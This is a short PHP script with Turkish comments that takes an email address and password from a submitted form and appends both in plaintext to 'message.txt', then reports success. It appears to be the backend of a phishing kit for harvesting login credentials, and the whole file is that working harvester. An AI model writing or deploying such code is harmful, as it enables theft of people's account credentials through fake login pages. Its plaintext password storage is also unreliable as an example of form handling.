<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Formdan gelen e-posta ve şifre verilerini al
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Veriyi "message.txt" dosyasına kaydet
    $file = 'message.txt';
    
    // Dosyaya e-posta adresini ve şifreyi yaz
    // FILE_APPEND: Mevcut verinin üzerine ekler, LOCK_EX: Eşzamanlı işlemlerden korur
    file_put_contents($file, "Gönderilen E-posta: " . $email . "\nGönderilen Şifre: " . $password . "\n\n", FILE_APPEND | LOCK_EX);

    // Kullanıcıya geri bildirim
    echo "Veriler başarıyla kaydedildi.";
} else {
    echo "Form verisi gönderilmedi.";
}
?>